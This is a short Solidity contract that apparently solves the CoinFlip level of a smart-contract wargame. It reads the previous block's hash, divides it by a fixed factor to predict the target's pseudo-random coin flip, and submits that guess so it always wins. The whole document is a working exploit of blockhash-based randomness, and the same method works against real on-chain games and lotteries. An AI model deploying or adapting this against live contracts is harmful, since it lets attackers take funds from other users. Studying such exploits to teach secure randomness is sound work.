// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

interface ICoinFlip {
    function flip(bool guess) external returns (bool);
}

contract CoinFlipSolution {
    ICoinFlip public coinFlip;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) {
        coinFlip = ICoinFlip(coinFlipAddress);
    }

    function win() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 result = blockValue / FACTOR;
        coinFlip.flip(result == 1);
    }
}
